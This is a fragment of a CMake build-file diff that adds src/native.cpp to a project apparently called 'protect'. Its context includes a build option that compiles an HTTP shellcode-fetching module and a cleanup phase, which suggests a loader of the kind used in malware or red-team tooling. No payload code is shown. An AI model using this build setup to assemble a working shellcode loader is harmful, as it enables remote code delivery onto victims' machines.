@@ -40,7 +40,7 @@ if(NOT USE_PROTECT_VPROTECT)
     message(FATAL_ERROR "protect: no variant enabled — set USE_PROTECT_VPROTECT=ON")
 endif()
 
-set(SOURCES src/main.cpp src/phases/cleanup/cleanup.cpp)
+set(SOURCES src/main.cpp src/native.cpp src/phases/cleanup/cleanup.cpp)
 
 if(USE_SHELLCODE_FETCH_HTTP)
     list(APPEND SOURCES src/phases/shellcode/fetch_http.cpp)
